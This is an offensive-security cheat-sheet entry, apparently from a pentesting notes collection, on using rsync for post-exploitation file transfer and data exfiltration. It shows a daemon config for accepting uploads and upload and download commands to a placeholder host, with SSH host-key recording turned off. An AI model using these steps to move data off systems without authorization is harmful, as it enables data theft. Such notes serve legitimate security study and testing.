---
author(s):
  - Userware
tags:
  - post-exploitation
  - file-transfer-and-data-exfiltration
  - rsync
  - linux
---
# Rsync

## 01 - Server Setup

> [!IMPORTANT] Conditions
> The SSH server must have `rsync` installed.

Install `rsync` according to your package manager.

```
$ sudo apt install -y rsync

$ sudo pacman -S rsync
```

Setup an rsync server to upload files.

```
$ cat > rsync.conf << EOF
[up]
path=/path/to/directory
read only=false
uid=<username_ID>
gid=<group_ID>
EOF

$ mkdir /path/to/directory

$ sudo rsync --daemon --port=873 --config=rsync.conf --no-detach
```

## 02 - Upload

```
$ rsync -r[v]huzPe "ssh -o UserKnownHostsFile=/dev/null [-p <PORT>]" <file_source> <username>@<IP>:<file_destination>
```

## 03 - Download

```
$ rsync -r[v]huzPe "ssh -o UserKnownHostsFile=/dev/null [-p <PORT>]" <username>@<IP>:<file_source> <file_destination>
```

---
## References

### Source Repository

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)